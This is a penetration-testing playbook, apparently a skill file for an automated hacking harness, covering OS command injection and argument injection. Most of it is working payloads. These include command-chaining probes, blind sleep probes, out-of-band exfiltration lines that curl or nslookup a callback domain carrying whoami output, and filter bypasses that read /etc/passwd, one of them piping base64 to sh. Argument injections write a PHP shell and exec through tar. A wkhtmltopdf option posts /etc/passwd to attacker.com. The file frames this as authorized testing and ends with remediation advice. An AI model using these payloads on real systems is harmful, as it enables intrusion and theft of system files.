---
name: web-command-injection-rce
description: OS Command Injection assessment, shell metacharacter injection, blind time-delay and OOB exfiltration, argument injection, and HTTP Parameter Pollution (HPP).
---

# OS Command Injection & Argument Pollution Assessment

## 1. Prerequisites & Input Contract
- **Authorization Scope:** Verified target endpoints invoking system utilities (network diagnostics, ping/traceroute tools, image converters, archive handlers) in `.hacker-harness/scope.yaml`.
- **Target Parameters:** Text inputs passed into shell interpreters or system binaries (`ip`, `host`, `file`, `format`, `options`, `query`).
- **Traffic Routing:** Route all test probes through Caido proxy.

---

## 2. Core Attack Heuristics & Step-by-Step Flow

### Step 1: Shell Metacharacter & Separator Probing
Inject command chaining operators and command substitutions:
```text
; id
| id
|| id
& id
&& id
`id`
$(id)
\n id
```

### Step 2: Blind Command Injection (Time-Delay & Out-of-Band)
When command output is not returned directly in the response:
1. **Time-Based Probing:**
   ```http
   POST /api/v1/system/ping HTTP/1.1
   Host: target.example.com
   Content-Type: application/json

   {"host": "127.0.0.1; sleep 5"}
   {"host": "127.0.0.1 && sleep 5"}
   {"host": "127.0.0.1 | sleep 5"}
   ```
2. **Out-of-Band DNS/HTTP Exfiltration:**
   ```http
   {"host": "127.0.0.1; curl http://{{ oob_domain }}/$(whoami)"}
   {"host": "127.0.0.1; nslookup $(whoami).{{ oob_domain }}"}
   ```

### Step 3: Whitespace & Character Filter Bypasses
If spaces, slashes, or specific characters are filtered:
- **Internal Field Separator (IFS):** `;cat$IFS/etc/passwd` or `;cat${IFS}/etc/passwd`
- **Brace Expansion:** `;{cat,/etc/passwd}`
- **Hex/Base64 Encoding:** `;echo$IFS'Y2F0IC9ldGMvcGFzc3dk'|base64$IFS-d|sh`
- **Environment Variable Concatenation:** `$PATH` substring extraction

### Step 4: HTTP Parameter Pollution (HPP) & Argument Injection
1. **Parameter Pollution:** Repeating parameter keys to confuse front-end WAFs and back-end web frameworks:
   - `?param=value1&param=value2` (PHP takes value2, ASP.NET concatenates `value1,value2`, NodeJS creates an array).
2. **CLI Argument Injection:** Passing leading hyphens into non-shell invocations:
   - Git: `--upload-pack="touch /tmp/pwned"`
   - Curl: `-o /var/www/html/shell.php -d "<?php ..."`
   - Tar: `--checkpoint=1 --checkpoint-action=exec=sh`

---

## 3. Empirical Disclosed Report Patterns & High-Risk Matrices

| Vulnerability Vector | Mechanism | Empirical Disclosed Pattern | Expected Evidence Marker |
|---|---|---|---|
| **Network Diagnostic Ping Tool** | Unsanitized `ping -c 1 $host` in PHP/Node | `{"ip": "127.0.0.1; id"}` | `uid=... gid=...` in response |
| **Video/Image Conversion Utility** | `ffmpeg -i $url` argument injection | URL set to `concat:http://...\|id` | Command output or OOB connection |
| **Git Clone Submodule Hook** | Webhook triggers `git clone --recurse-submodules` | Repository `.gitmodules` points to malicious config | RCE on build server |
| **PDF Converter Argument Injection** | `wkhtmltopdf` options parameter injection | `?options=--post%20file:///etc/passwd%20http://attacker.com` | File exfiltration via HTTP POST |

---

## 4. Evidence Collection & Validation Gate
1. **Self-Contained Proof:** Capture HTTP request and response showing command output (e.g. `uid=...`) or synchronized time-delay logs ($\ge 5000\text{ms}$).
2. **Impact Proof:** Execute non-destructive commands (`id`, `whoami`, `uname -a`, `sleep 5`) without altering system binaries or files.
3. **Remediation:** Avoid passing user input to shell interpreters (e.g. `system()`, `exec()`, `shell_exec()`); use array-based parameterization (`subprocess.run(["ping", "-c", "1", host])`), and strictly validate and sanitize input against an alphanumeric allowlist.
